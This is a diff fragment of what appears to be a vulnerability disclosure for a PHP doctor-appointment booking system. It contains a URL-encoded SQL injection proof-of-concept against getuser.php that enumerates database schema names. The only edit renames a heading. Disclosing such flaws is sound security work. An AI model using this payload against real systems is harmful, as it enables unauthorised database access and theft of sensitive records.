@@ -10,5 +10,5 @@
 * POC  
 payload:  http://localhost/[PATH]/getuser.php?q=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%2C0x7176627871%29%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA%23  
 ![image](https://github.com/BigTiger2020/Online-Doctor-Appointment-Booking-System-PHP/blob/main/002.png)  
-* SQL map:  
+* sql commands:  
 ![image](https://github.com/BigTiger2020/Online-Doctor-Appointment-Booking-System-PHP/blob/main/004.png)  
